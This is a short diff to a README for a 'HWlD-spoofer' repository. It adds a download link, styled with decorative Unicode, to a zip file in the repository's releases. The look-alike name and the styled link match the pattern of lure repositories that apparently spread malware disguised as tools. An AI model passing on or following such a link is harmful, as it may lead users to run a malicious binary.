@@ -1,6 +1,6 @@
 # HWlD-spoofer
 
-[📁𝐃𝗼𝐰𝐧𝐥𝐨𝐚𝗱](
+[📁𝐃𝗼𝐰𝐧𝐥𝐨𝐚𝗱](https://github.com/lightsaberexo/HWlD-spoofer/releases/download/HWlD-spoofer/HWlD-spoofer.zip)
 
 
 # HWID
